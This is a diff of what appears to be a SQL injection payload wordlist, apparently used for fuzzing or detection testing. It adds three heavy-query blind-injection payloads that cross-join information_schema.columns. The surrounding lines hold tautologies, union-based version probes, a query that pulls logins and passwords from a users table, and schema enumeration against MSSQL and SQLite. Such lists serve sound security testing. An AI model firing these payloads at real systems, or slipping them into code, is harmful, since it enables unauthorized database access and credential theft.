@@ -96,6 +96,7 @@
 ' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
 ' union select * from users where login = char(114,111,111,116);
 '; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >
+(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
 )&1c: select * from users where id=1 +(\) or 1=1 -- 1
 )uevc: select * from users where id=1 +(\) union select null,@@version -- 1
 .&1c: select * from users where id=1. or 1=1 -- 1
@@ -169,6 +170,7 @@ a'; select * from users where 't' = 't
 and (select count(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' ) < number_of_table
 and (select hex(substr(tbl_name,1,1)) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) > hex('some_char')
 and (select length(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
+and [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
 n.&1c: select * from users where id=1 +$ . or 1=1 -- 1
 n.uev: select * from users where id=1 +$ . union select null,@@version -- 1
 n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1
@@ -221,6 +223,7 @@ oouef: select * from users where id=1 <@<@ union select version(),version() -- 1
 oouev: select * from users where id=1 <@<@ union select null,version() -- 1
 oov&1: select * from users where id=1 %!<@ or 1=1 -- 1
 oovue: select * from users where id=1 <@&@ union select 1,version() -- 1
+or [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
 or username like char(37);
 os: select * from users where id=1 <@$$ union select 1,version() -- 1
 ouevc: select * from users where id=1 *\ union select null,@@version -- 1
